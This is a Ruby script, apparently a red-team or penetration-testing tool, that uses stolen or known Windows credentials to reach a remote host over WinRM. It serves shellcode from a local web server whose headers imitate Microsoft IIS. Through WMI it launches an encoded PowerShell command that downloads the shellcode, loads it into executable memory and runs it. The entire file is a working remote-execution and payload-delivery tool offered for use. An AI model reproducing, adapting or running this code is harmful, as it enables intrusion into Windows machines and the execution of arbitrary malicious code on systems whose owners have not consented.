#!/usr/bin/env ruby

require 'thin'
require 'pry'
require 'socket'
require 'resolv-replace'
require 'winrm'
require 'base64'
require 'time'

$root = File.expand_path(File.dirname(__FILE__))

def pputs(msg)
  msg.gsub!("", "\x1b[1m")
  msg.gsub!("", "\x1b[22m")
  puts("\x1b[s\x1b[35m  \x1b[1m[+]\x1b[22m #{msg}\x1b[u")
end

if ARGV.length != 5
  puts("")
  puts(" usage: rmrun.rb <domain> <user> <pass> <payload> <winrm-url>")
  puts("")
  puts("   Uses WinRM to execute a powershell script that will download a shellcode")
  puts("   payload, load it into executable memory, and execute it.  The invocation")
  puts("   is as implemented in `download-execute.ps1'.  Uses the 'thin' gem to")
  puts("   provide an ad-hoc web server to facilitate the download, and 'winrm' to")
  puts("   accomplish remote invocation.")
  puts("")
  puts(" Example:")
  puts("")
  puts("   $ rmrun.rb AD user Password1 net.shellcode http://192.168.0.2:5985/wsman")
  puts("")
  exit(1)
else
  pputs("Running WinRM launcher to execute shellcode")
end

$payload = nil
File.open(ARGV[3], "rb") do |fd|
  $payload = fd.read
end

pputs("Loaded #{$payload.length} bytes of payload")

$downcount = 0

app = Rack::Builder.new do
  @logger = nil
  headers = {
    'Content-Type' => 'application/octet-stream',
    'Content-Length' => $payload.length.to_s,
    'Connection' => 'Close',
    'Server' => 'Microsoft-IIS/8.0',
    'Vary' => 'Accept-Encoding',
    'X-UA-Compatible' => 'IE=Edge,chrome=1',
    'Date' => DateTime::now().strftime("%a, %d %b %Y %H:%M:%S GMT")
  }
  run Proc.new { |env| $downcount += 1; [200, headers, [$payload]] }
end

pputs("Created downloader app")

Thin::Logging.silent = true
server = Thin::Server.new({:signals => false}, app)
Thread.new { server.start }

ip = Socket.ip_address_list.detect { |intf| intf.ipv4_private? }.ip_address
url = "http://#{ip}:#{server.port}/net.shellcode"
pputs("Started web server at #{url}")

pputs("Connecting to #{ARGV[4]}")

begin
  opts = {
    endpoint: ARGV[4],
    user: "#{ARGV[0]}\\#{ARGV[1]}",
    transport: :negotiate,
    password: ARGV[2]
  }
  conn = WinRM::Connection.new(opts)
rescue Exception => e
  pputs("Error: #{e.message}")
  exit(3)
end

script = File.read("#{$root}/download-execute.ps1")
script.sub!("FILEURL", url)
enc = Base64.encode64(script.encode("utf-16le")).split(/\n/).map(&:strip).join()
pputs("Prepared script")
before = $downcount 

begin
  conn.shell(:powershell) do |shell|
    pputs("launching script...")
    cmd = "Invoke-WmiMethod -path win32_process -name create -argumentlist \"powershell.exe -EncodedCommand #{enc}\""
    output = shell.run(cmd) { }
  end
rescue Exception => e
  pputs("Process terminated: #{e.class.to_s}")
end

pputs("Waiting to confirm download...")

while true
  sleep 0.1
  break if $downcount > before
end

sleep(0.1)
pputs("Payload completed, exiting")
